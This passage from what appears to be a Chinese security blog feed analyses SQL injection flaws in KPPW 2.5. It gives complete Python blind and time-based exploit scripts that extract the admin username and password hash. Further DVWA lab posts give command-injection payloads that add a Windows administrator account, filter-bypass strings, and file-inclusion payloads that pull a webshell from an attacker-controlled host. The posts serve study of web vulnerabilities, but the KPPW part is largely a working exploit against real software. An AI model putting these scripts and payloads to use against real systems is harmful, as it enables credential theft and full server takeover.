kppw25</code></pre><p><strong>在浏览器地址栏输入</strong></p><pre><code>http://192.168.50.157/kppw25/install</code></pre><p><strong>进行安装</strong></p><p><strong>如果到安装第二步一直进入不了第三步，再安装一下gd库扩展，重启一下服务即可</strong></p><pre><code>yum -y install php-gdservice httpd restart</code></pre><p><strong>如果不出意外的话会出现这个界面，安装的第三步</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/29C4afBc1E.PNG" alt="mark"><br><strong>我们输入mysql数据库的密码并且设置后台登陆密码点击提交，安装成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/di2fadg729.PNG" alt="mark"></p><h3 id="对漏洞分析利用并编写exp"><a href="#对漏洞分析利用并编写exp" class="headerlink" title="对漏洞分析利用并编写exp"></a>对漏洞分析利用并编写exp</h3><p><strong>KPPW2.5版本曾爆出了特别多的sql注入漏洞，在这里选择几个注入漏洞来研究学习一下</strong></p><p><strong>注入点1</strong></p><p><strong>1.漏洞分析</strong></p><p><strong>文件/control/user/account_auth.php</strong></p><pre><code>$arrAllowAuth = array(&apos;realname&apos;,&apos;enterprise&apos;,&apos;bank&apos;,&apos;mobile&apos;,&apos;email&apos;);if ($code&amp;&amp;in_array($code,$arrAllowAuth)) {    $code or $code = $keys [&apos;0&apos;];     $code or kekezu::show_msg ( $_lang [&apos;param_error&apos;], &quot;index.php?do=auth&quot;, 3, &apos;&apos;, &apos;warning&apos; );    $auth_class = &quot;keke_auth_&quot; . $code . &quot;_class&quot;;    $objAuth = new $auth_class ( $code );     $auth_item = $arrAllAuthItems [$code];     $auth_dir = $auth_item [&apos;auth_dir&apos;];     $arrAuthInfo = $objAuth-&gt;get_user_auth_info ( $gUid, 0, $intBankAid );     require S_ROOT . &quot;/auth/$code/control/index.php&quot;;    require keke_tpl_class::template ( &apos;auth/&apos; . $code . &apos;/tpl/&apos; . $_K [&apos;template&apos;] . &apos;/&apos;.$step );    die;} else {    $real_pass = keke_auth_fac_class::auth_check ( &apos;enterprise&apos;, $gUid ) or $real_pass = keke_auth_fac_class::auth_check ( &quot;realname&quot;, $gUid );    $arrHasAuthItem = keke_auth_fac_class::get_auth ( $gUserInfo );    $arrUserAuthInfo = $arrHasAuthItem [&apos;info&apos;];}</code></pre><p><strong>仔细看看这里的：</strong></p><pre><code>$arrAuthInfo = $objAuth-&gt;get_user_auth_info ( $gUid, 0, $intBankAid );</code></pre><p><strong>这里的变量$intBankAid进入了函数<code>get_user_auth_info</code>函数 跟进函数<code>get_user_auth_info</code> 文件<code>/lib/sys/keke_auth_base_class.php</code>：</strong></p><pre><code>public function get_user_auth_info($uid,$is_username=0,$show_id=&apos;&apos;){        $sql=&quot;select * from &quot;.TABLEPRE.$this-&gt;_auth_table_name;        if($uid){            $is_username==&apos;0&apos; and $sql.=&quot; where uid = &apos;$uid&apos; &quot; or $sql.=&quot; where username = &apos;$uid&apos; &quot;;            $show_id and $sql.=&quot; and &quot;.$this-&gt;_primary_key.&quot;=&quot;.$show_id;            $sql .=&quot; order by $this-&gt;_primary_key desc&quot;;            $data = db_factory::query($sql);            if(sizeof($data)==1){                return $data[0];            }else{                return $data;            }        }else{            return array();        }    }</code></pre><p><strong>接收到的变量$intBankAid——$show_id，然后$show_id进入$sql 整个过程中变量$intBankAid未过滤，最后进入$sql进入数据库，导致sql注入漏洞</strong></p><p><strong>2.漏洞证明</strong><br><strong>首先注册一个账号，然后访问</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/bAiFL66i3m.PNG" alt="mark"><br><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147</code><br><strong>接下来要在银行认证中添加一个新账户，信息随便填，在这里是测试不需要真实信息，但是信息格式一定要正确</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/3glfhjHF30.PNG" alt="mark"><br><strong>添加完账户后在银行认证中点击立即认证</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/hI72b1L1ke.PNG" alt="mark"><br><strong>认证完成后回到<code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/bcLgl5B7bc.PNG" alt="mark"><br><strong>intBankAid存在盲注，盲注类型为基于bool的盲注，<code>and 1=1</code>与<code>and 1=2</code>返回的页面结果不一样，证明存在盲注</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/ALb2d2G1k0.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/kd4Cc9gjhF.PNG" alt="mark"><br><strong>用burp的comparer模块对返回结果做对比</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/26h9A6lj2E.PNG" alt="mark"><br><strong>3.漏洞利用与exp编写</strong><br><strong>证明了存在基于bool的逻辑判断盲注，我们可以在intBankAid参数后构造逻辑判断，根据页面的差别来判断数据库中的数据</strong></p><p><strong>mid函数为mysql的字符串截取函数，截取<code>select+concat(username,password)+from+keke_witkey_member+limit+0,1</code>的第一个字符，与CHAR(97)，也就是a字符进行比较，如果相等说明and后的逻辑为真返回正常页面，可以看出数据库查询结果的第一个字符为’a’</strong></p><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=CHAR(97)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/DAjiD497K2.PNG" alt="mark"><br><strong>如果and后的逻辑判断为假，将返回不同的页面</strong></p><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=CHAR(98)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/8EBD1CDhjh.PNG" alt="mark"><br><strong>由此可用python编写exp读取admin的用户名和密码，代码如下</strong></p><pre><code>#encoding:utf-8#kppw2.5 base bool blind sqliimport requestsheaders={    &apos;Cookie&apos;:&apos;PHPSESSID=8p38igtr7fvvvi25d28rrql740&apos;}#获取用户身份payload=&quot;http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147&quot;rtrue=requests.get(payload,headers=headers).content#向正确页面发起一次请求获取返回结果,相当于bool判断为真的返回页面data=&quot;&quot;for i in range(1,38):#admin用户名和密码一共长为37    for j in range(33,128):#循环可显示字符的ascii码值        payload=&quot;http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),%d,1)=CHAR(%d)&quot;%(i,j)        r=requests.get(payload,headers=headers).content        if r==rtrue:            data=data+chr(j)            print data            break</code></pre><p><strong>脚本跑出admin的用户名和密码，可以在解密网站解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/GB3j6HcK50.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/j6f27Db7FB.PNG" alt="mark"><br><strong>注入点2</strong><br><strong>1.漏洞分析</strong><br><strong>文件/control/pubgoods.php</strong></p><pre><code>&lt;?phpkekezu::check_login();$strPageTitle = &apos;发布商品-&apos;.$_K [&apos;html_title&apos;];$strPageKeyword = &apos;发布商品,&apos;.$_K [&apos;html_title&apos;];$strPageDescription = $kekezu-&gt;_sys_config[&apos;index_seo_desc&apos;];$id = intval($id);$step = strval(trim($step));......$strUrl = &quot;index.php?do=pubgoods&amp;id=&quot;.$id;$_SESSION[&apos;spread&apos;] = &apos;index.php?do=pubgoods&apos;;require S_ROOT . &quot;/shop/&quot; . $arrModelInfo[&apos;model_dir&apos;] . &quot;/control/pub.php&quot;;</code></pre><p><strong>看最后两行，这里的<code>$arrModelInfo[&#39;model_dir&#39;]</code>可以为goods或者service 当<code>$arrModelInfo[&#39;model_dir&#39;]</code>为goods时，我们跟进文件： <code>/shop/goods/control/pub.php</code></strong></p><pre><code>&lt;?php defined ( &apos;IN_KEKE&apos; ) or exit ( &apos;Access Denied&apos; );$stdCacheName = &apos;service_cache_&apos;.$id.&apos;_&apos; . substr ( md5 ( $gUid ), 0, 6 );$objRelease = goods_release_class::get_instance ($id);$objRelease-&gt;get_service_obj ( $stdCacheName ); $arrPubInfo = $objRelease-&gt;_std_obj-&gt;_release_info; $arrConfig = $objRelease-&gt;_service_config; $arrPubInfo[&apos;indus_pid&apos;] and $arrAllIndustrys = CommonClass::getIndustryByPid($arrPubInfo[&apos;indus_pid&apos;],&apos;indus_id,indus_pid,indus_name&apos;);switch ($step) {    case &apos;step1&apos;:......if($action == &apos;delete_image&apos;){            $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileid);            $arrFileInfo = db_factory::get_one($strSql);            $resText = CommonClass::delFileByFileId($fileid);            if($resText){                $array = explode(&apos;,&apos;, $arrPubInfo[&apos;file_ids&apos;]);                $newArr = CommonClass::returnNewArr($arrFileInfo[&apos;save_name&apos;], $array);                $_POST[&apos;file_ids&apos;] = implode(&quot;,&quot;, $newArr);                $arrPubInfo and $_POST = array_merge ( $arrPubInfo, $_POST);                $objRelease-&gt;save_service_obj ($_POST, $stdCacheName );                 kekezu::echojson(&apos;删除成功&apos;,1,array(&apos;fileid&apos;=&gt;$fileid,&apos;save_name&apos;=&gt;$arrFileInfo[&apos;save_name&apos;]));die;            }        }        if($action == &apos;delete_goodsfile&apos;){            $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileid);            $arrFileInfo = db_factory::get_one($strSql);            $resText = CommonClass::delFileByFileId($fileid);</code></pre><p><strong>当action=delete_image，或者action=delete_goodsfile时，参数fileid都会进入sql语句，而且没有过滤，没有引号保护，最后导致sql注入 继续往下，参数fileid还进入了函数delFileByFileId，继续跟踪： 文件/lib/inc/CommonClass.php：</strong></p><pre><code>public static function delFileByFileId($fileId){        $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileId);        $arrFileInfo = db_factory::get_one($strSql);        $filename = S_ROOT.$arrFileInfo[&apos;save_name&apos;];        if(file_exists($filename)){            unlink($filename);        }        return db_factory::execute(&quot;delete from &quot;.TABLEPRE.&quot;witkey_file where file_id = &quot;.$fileId);    }</code></pre><p><strong>这里的fileid同样进入了select和delete语句，都没有过滤处理和保护，导致两处注入 这里在delete时，可以删除用户发布的商品或者任务的图片已经文件，而且这里最后删除时只根据fileid删除，没有判断删除对象的用户属性，导致可以任意删除任意用户发布的文件，导致越权操作。 下面来看看文件/lib/inc/CommonClass.php，这是一个全局调用的函数 来看看有多少文件使用了/lib/inc/CommonClass.php中的这个delFileByFileId函数</strong></p><p><strong>可以看到这里一个有12个文件使用了这个delFileByFileId函数，我们再来找两个其他文件，看看是不是也没有处理传入delFileByFileId函数的fileid参数 第一个文件/control/taskhandle.php：</strong></p><pre><code>case &apos;workover&apos;:        if (isset($formhash)&amp;&amp;kekezu::submitcheck($formhash)){            $resText = $objTask-&gt;work_over($tarContent, $file_id,intval($modify));            if($resText === true){                kekezu::show_msg ( &apos;操作成功&apos;, &apos;index.php?do=task&amp;id=&apos;.$taskId, 3, NULL, &apos;ok&apos; );            }else{                kekezu::show_msg ( $resText, &apos;index.php?do=task&amp;id=&apos;.$taskId, 3, NULL, &apos;fail&apos; );            }        }        if($action == &apos;deleteFile&apos;){            $resText = CommonClass::delFileByFileId($fileid);            if($resText){                kekezu::echojson(&apos;删除成功&apos;,1,array(&apos;fileid&apos;=&gt;$fileid));die;            }        }</code></pre><p><strong>fileid在全文上下没有处理，这里进入函数delFileByFileId后，也会导致注入 其他的就不一一列出来了，都存在同样的问题 fileid没有处理，直接进入函数delFileByFileId，然后fileid进入select和delete语句，导致sql注入，并且存在越权删除任意用户文件的漏洞 </strong><br><strong>2.漏洞证明</strong></p><pre><code>http://192.168.50.157/kppw25/index.php?do=pubgoods&amp;step=step1&amp;action=delete_image&amp;fileid=5566)+and+1=if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)=char(97),sleep(5),0)%23</code></pre><p><strong>来解释一下上面的payload，mid为mysql的字符串截取函数，截取<code>select+concat(username,password)+from+keke_witkey_member+limit+0,1</code>的第一个字符，与CHAR(97)，也就是a字符进行比较，如果相等就延时5s再响应页面，否则就立即响应页面，因为查询有延时可以判断数据库查询结果的第一个字符为’a’（admin）,所以请求会有10s的延时，这里会延迟10秒返回 因为这里的存在两处select，所以sleep(5)了两次</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/hdmf1Dchcb.PNG" alt="mark"><br><strong>根据延时注入用python编写exp可以将admin的用户名和密码注入出来，代码如下</strong></p><pre><code>#encoding:utf-8#kppw2.5 base time blind sqliimport requestsimport timeheaders={    &apos;Cookie&apos;:&apos;PHPSESSID=8p38igtr7fvvvi25d28rrql740&apos;}#获取用户身份data=&quot;&quot;for i in range(1,38):#admin用户名和密码一共长为37    for j in range(33,128):#循环可显示字符的ascii码值        payload=&quot;http://192.168.50.157/kppw25/index.php?do=pubgoods&amp;step=step1&amp;action=delete_image&amp;fileid=5566) and 1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),%d,1)=CHAR(%d),sleep(5),0)&quot;%(i,j)        payload=payload+&quot;%23&quot;        starttime=time.time()#获取发起请求的时间        r=requests.get(payload,headers=headers)        if time.time()-starttime&gt;5:#获取接收服务器响应的时间，如果存在延时，说明查询到了内容，将结果输出            data=data+chr(j)            print data            break</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/kDhKfiEFHi.PNG" alt="mark"><br><strong>以上是KPPW2.5的两个注入点，还有很多注入点，注入手法和漏洞都大差不易</strong></p><p><strong>通过注入出的网站管理员密码，可以进入后台，进行下一步渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/H38eHf86fm.PNG" alt="mark"></p><h3 id="本文用到的实验代码"><a href="#本文用到的实验代码" class="headerlink" title="本文用到的实验代码"></a>本文用到的实验代码</h3><p><strong>KPPW2.5源码</strong></p><pre><code>链接：https://pan.baidu.com/s/1eTPzBBc 密码：xdr6</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;KPPW2-5版本几处sql注入漏洞利用以及exp编写&quot;&gt;&lt;a href=&quot;#KPPW2-5版本几处sql注入漏洞利用以及exp编写&quot; class=&quot;headerlink&quot; title=&quot;KPPW2.5版本几处sql注入漏洞利用以及exp编写&quot;&gt;&lt;/a&gt;KPPW2
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="exp编写" scheme="http://yoursite.com/tags/exp%E7%BC%96%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>dvwa Command Injection</title>
    <link href="http://yoursite.com/2017/12/26/DVWACommandInjection/"/>
    <id>http://yoursite.com/2017/12/26/DVWACommandInjection/</id>
    <published>2017-12-26T08:01:13.787Z</published>
    <updated>2017-12-26T08:17:02.090Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa命令执行漏洞"><a href="#dvwa命令执行漏洞" class="headerlink" title="dvwa命令执行漏洞"></a>dvwa命令执行漏洞</h1><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p><strong>由于代码使用了危险的函数并且过滤不严导致可以远程执行命令，属于十分高危的漏洞，甚至攻击者可以直接利用该漏洞拿下一整个服务器的最高权限，比较典型的有struts框架远程代码执行漏洞</strong></p><p><strong>来看dvwa，感觉例子并不是多好</strong></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ]  ) ) {    // Get input    $target = $_REQUEST[ &apos;ip&apos; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {        // Windows        $cmd = shell_exec( &apos;ping  &apos; . $target );    }    else {        // *nix        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );    }    // Feedback for the end user    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p><strong>可以看出没有任何防御，直接将我们提交的内容执行</strong><br><strong>我们可以利用此漏洞新建一个管理员直接获取服务器最高权限</strong></p><p><strong>payload</strong></p><p><strong>创建用户</strong></p><pre><code>127.0.0.1&amp;&amp;net user lawliet lawliet /add</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/60LkDBejd7.PNG" alt="mark"><br><strong>将其加到管理组</strong></p><pre><code>127.0.0.1&amp;&amp;net localgroup administrators lawliet /add</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/cFl2mGfK1E.PNG" alt="mark"><br><strong>不出问题我们就成为了服务器的管理员，利用远程桌面连接，ctrl+r，输入mstsc，就可以进行远程服务器连接，拿下服务器权限</strong></p><p><strong>输入ip和用户名</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/d5231j7gHh.PNG" alt="mark"><br><strong>输入密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/ffc3Ga6jcJ.PNG" alt="mark"><br><strong>连接成功，以管理员身份进入服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/KECei8f0B4.PNG" alt="mark"></p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ]  ) ) {    // Get input    $target = $_REQUEST[ &apos;ip&apos; ];    // Set blacklist    $substitutions = array(        &apos;&amp;&amp;&apos; =&gt; &apos;&apos;,        &apos;;&apos;  =&gt; &apos;&apos;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {        // Windows        $cmd = shell_exec( &apos;ping  &apos; . $target );    }    else {        // *nix        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );    }    // Feedback for the end user    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p><strong>过滤了<code>&amp;&amp;</code>和<code>;</code>，用&amp;连接即可执行命令，不再重复</strong></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ]  ) ) {    // Get input    $target = trim($_REQUEST[ &apos;ip&apos; ]);    // Set blacklist    $substitutions = array(        &apos;&amp;&apos;  =&gt; &apos;&apos;,        &apos;;&apos;  =&gt; &apos;&apos;,        &apos;| &apos; =&gt; &apos;&apos;,        &apos;-&apos;  =&gt; &apos;&apos;,        &apos;$&apos;  =&gt; &apos;&apos;,        &apos;(&apos;  =&gt; &apos;&apos;,        &apos;)&apos;  =&gt; &apos;&apos;,        &apos;`&apos;  =&gt; &apos;&apos;,        &apos;||&apos; =&gt; &apos;&apos;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {        // Windows        $cmd = shell_exec( &apos;ping  &apos; . $target );    }    else {        // *nix        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );    }    // Feedback for the end user    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p><strong>使用黑名单过滤，总会有落网之鱼，用<code>|</code>（前面有空格）连接即可绕过</strong></p><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ]  ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );    // Get input    $target = $_REQUEST[ &apos;ip&apos; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet )     == 4 ) ) {        // If all 4 octets are int&apos;s put the IP back together.        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {        // Windows        $cmd = shell_exec( &apos;ping  &apos; . $target );        }        else {            // *nix            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );        }        // Feedback for the end user        echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;    }    else {        // Ops. Let the user name theres a mistake        echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p><strong>可以看出用白名单的方式限制了输入内容只能为ip地址，防止了连接其他命令，预防了命令执行漏洞，再一次说明了白名单的安全性远高于黑名单</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa命令执行漏洞&quot;&gt;&lt;a href=&quot;#dvwa命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;dvwa命令执行漏洞&quot;&gt;&lt;/a&gt;dvwa命令执行漏洞&lt;/h1&gt;&lt;h3 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>dvwa File Inclusion</title>
    <link href="http://yoursite.com/2017/12/26/DVWAFileInclusion/"/>
    <id>http://yoursite.com/2017/12/26/DVWAFileInclusion/</id>
    <published>2017-12-26T06:46:15.714Z</published>
    <updated>2017-12-26T07:13:26.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa文件包含漏洞"><a href="#dvwa文件包含漏洞" class="headerlink" title="dvwa文件包含漏洞"></a>dvwa文件包含漏洞</h1><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p><strong>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞分为本地文件包含和远程文件包含，当php开启了<code>allow_url_include</code>时，将允许远程文件包含，为了研究文件包含,我们将<code>allow_url_include</code>打开，文件包含漏洞可以用来遍历目录文件，结合文件上传漏洞可以getshell，或者直接利用远程文件包含同样可以getshell</strong></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口，php.ini中<code>allow_url_include</code>为<code>On</code></strong><br><strong>一台win7,攻击者服务器，ip为192.168.50.155，用来远程文件包含</strong></p><p><strong>之前我们在文件上传漏洞中上传了图片马，我们利用文件包含漏洞去包含图片马，同样可以直接包含php一句话木马文件getshell，由于文件包含的特性，不管文件后缀名是什么，只要当中有php代码，都会当做php执行</strong></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];?&gt; </code></pre><p><strong>可以看到没有任何过滤，我们可以直接利用本地文件包含包含之前的图片马</strong></p><p><strong>payload</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=../../hackable/uploads/heishacker.jpg</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/eE969i5jiA.PNG" alt="mark"><br><strong>同时可以远程文件包含，包含远程服务器上的shell.txt，里面写着一句话木马</strong></p><p><strong>payload</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=http://192.168.50.155/shell.txt</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/a8DA5LeKHj.PNG" alt="mark"><br><strong>这两种方式都可以getshell</strong></p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt; </code></pre><p><strong>可以看出用str_replace将<code>../</code>,<code>http://</code>,<code>https://</code>都替换成了空，但是str_replace这种方法是极其不安全的，首先这个函数只会检查一次，其次代码没有判断大小写，下面是绕过的payload</strong></p><p><strong>本地包含绕过</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=..././..././hackable/uploads/heishacker.jpg</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/gbc08eh46D.PNG" alt="mark"><br><strong>远程包含绕过</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=Http://192.168.50.155/shell.txt</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/JD691hGGfj.PNG" alt="mark"><br>    <a href="http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.50.155/shell.txt" target="_blank" rel="external">http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.50.155/shell.txt</a><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/Gh0mkE7H9D.PNG" alt="mark"></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];if(!function_exists(&apos;fnmatch&apos;)) {    function fnmatch($pattern, $string) {        return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\*&apos; =&gt; &apos;.*&apos;, &apos;\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string);    } // end} // end if// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !=     &quot;include.php&quot; ) {    // This isn&apos;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt;</code></pre><p><strong>可以看出采用了白名单过滤，要求page后必须是以file开头的额，远程文件包含是不能使用了，我们可以用file协议包含图片马，同时要猜路径名，在文件上传中已经提到过，不在重复，可以看出白名单远比黑名单安全的多</strong></p><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];// Only allow include.php or file{1..3}.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {    // This isn&apos;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt; </code></pre><p><strong>可以看出完全使用了白名单过滤，只要求允许的文件出现在page后，这种方式是最安全的，有效的防止了文件包含</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa文件包含漏洞&quot;&gt;&lt;a href=&quot;#dvwa文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;dvwa文件包含漏洞&quot;&gt;&lt;/a&gt;dvwa文件包含漏洞&lt;/h1&gt;&lt;h3 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>dvwa File Upload</title>
    <link href="http://yoursite.com/2017/12/25/DVWAFileUpload/"/>
    <id>http://yoursite.com/2017/12/25/DVWAFileUpload/</id>
    <published>2017-12-25T09:59:14.364Z</published>
    <updated>2017-12-25T11:55:26.936Z</updated>
    
